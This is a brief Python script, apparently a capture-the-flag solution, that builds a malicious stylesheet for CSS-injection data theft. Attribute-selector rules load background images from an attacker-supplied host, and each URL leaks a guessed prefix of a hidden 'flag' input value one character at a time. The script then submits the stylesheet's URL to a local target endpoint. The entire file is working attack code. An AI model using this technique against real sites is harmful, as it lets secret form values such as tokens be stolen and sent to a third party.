from sys import argv
import sys


f=open('shell.css','w')
fuzz="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{_}"
flag=sys.argv[1]
for i in fuzz:
    tmp=flag
    payload='input[name=flag][value^="%s"] {background-image: url("%s?flag=%s");}' % (tmp+i,sys.argv[2],tmp+i)
    f.write(payload+"\n")
f.close()

import requests
data={
    'css':f'{sys.argv[2]}/shell.css'
}
r=requests.post(url="http://localhost:1337/send.html",data=data)
print(r.text)